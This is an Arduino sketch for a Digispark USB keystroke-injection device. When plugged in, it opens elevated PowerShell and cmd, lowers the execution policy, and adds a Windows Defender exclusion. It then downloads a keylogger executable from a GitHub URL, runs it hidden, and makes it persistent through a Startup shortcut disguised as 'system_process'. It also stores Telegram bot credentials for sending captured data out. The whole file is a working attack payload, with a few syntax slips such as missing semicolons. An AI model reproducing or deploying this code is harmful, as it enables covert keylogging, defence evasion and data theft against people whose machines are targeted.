#include "DigiKeyboard.h"

void setup() {}

void loop() {
	String BOTAPI = "API"
	String UID = "UID"
    String EXE = "https://github.com/SJAlanA/Key-Logger/blob/main/dist/keylogger.exe"

	DigiKeyboard.sendKeyStroke(0);
	DigiKeyboard.delay(100);
	DigiKeyboard.sendKeyStroke(0, MOD_GUI_LEFT,KEY_R);
	DigiKeyboard.delay(500);
	DigiKeyboard.print("powershell");
	DigiKeyboard.delay(1500);
	DigiKeyboard.sendKeyStroke(MOD_CONTROL_LEFT,MOD_SHIFT_LEFT,KEY_ENTER);
	DigiKeyboard.delay(1000);
	DigiKeyboard.sendKeyStroke(80);
	DigiKeyboard.delay(100);
	DigiKeyboard.sendKeyStroke(KEY_ENTER);
	DigiKeyboard.delay(500);

	DigiKeyboard.print("Set-ExecutionPolicy -ExecutionPolicy Unrestricted");
	DigiKeyboard.delay(1000);
	DigiKeyboard.print("A");
	DigiKeyboard.delay(1000);
	DigiKeyboard.print("EXIT");

	DigiKeyboard.delay(500);
	DigiKeyboard.sendKeyStroke(0, MOD_GUI_LEFT,KEY_R);
	DigiKeyboard.delay(500);
	DigiKeyboard.print("cmd.exe");
	DigiKeyboard.delay(100);
	DigiKeyboard.sendKeyStroke(MOD_CONTROL_LEFT,MOD_SHIFT_LEFT,KEY_ENTER);
	DigiKeyboard.delay(1000);
	DigiKeyboard.sendKeyStroke(80);
	DigiKeyboard.delay(100);
	DigiKeyboard.sendKeyStroke(KEY_ENTER);
	DigiKeyboard.delay(500);

	DigiKeyboard.print("mkdir \"%USERPROFILE%\\Dependency\" 2>nul & (echo " + BOTAPI + " && echo " + UID + ") > \"%USERPROFILE%\\Dependency\\telegram.details\"");
	DigiKeyboard.delay(500);

	DigiKeyboard.print("mkdir \"%USERPROFILE%\\Dependency\" 2>nul & (echo mkdir \"$env:windir\\temp\\Cache\" & echo Start-Process powershell -Verb RunAs -ArgumentList 'New-ItemProperty -Path \"HKLM:\\SOFTWARE\\Microsoft\\Windows Defender\\Exclusions\\Paths\" -Name \"C:\\Windows\\Temp\\Cache\" -Value \"C:\\Windows\\Temp\\Cache\" -PropertyType String -Force' & echo Invoke-WebRequest -Uri \"" + EXE +"\" -OutFile \"$env:windir\\temp\\Cache\\main.exe\" & echo Start-Process \"$env:windir\\temp\\Cache\\main.exe\" & echo $s=^(New-Object -COM WScript.Shell^).CreateShortcut^(\"$env:appdata\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\system_process.lnk\"^);$s.TargetPath=\"$env:windir\\temp\\Cache\\main.exe\";$s.Save^(^) & echo Remove-Item -LiteralPath $MyInvocation.MyCommand.Path -Force & echo EXIT) > \"%USERPROFILE%\\Dependency\\dl.ps1\"");
	DigiKeyboard.delay(500);

	DigiKeyboard.print("powershell -WindowStyle Hidden -File \"%USERPROFILE%\\Dependency\\dl.ps1\"");
	DigiKeyboard.delay(500);

	DigiKeyboard.print("EXIT");
	DigiKeyboard.delay(500);
}